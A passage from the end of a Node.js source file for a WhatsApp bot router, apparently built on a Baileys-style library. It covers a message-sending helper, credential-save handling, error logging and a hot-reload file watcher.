                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }

                return buffer;
            };      

            devaskNotBot.sendText = (jid, text, quoted = '', options) => devaskNotBot.sendMessage(jid, { text: text, ...options }, { quoted });

            devaskNotBot.ev.on('creds.update', saveCreds);

        } catch (error) {
            console.error(chalk.red("❌ Erreur dans BILALXD function:"), error);
        }
    }

    // Appeler la fonction BILALXD
    BILALXD(num);
});

module.exports = router; 

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.redBright(`🔄 Update detected in '${__filename}'`));
    delete require.cache[file];
    require(file);
});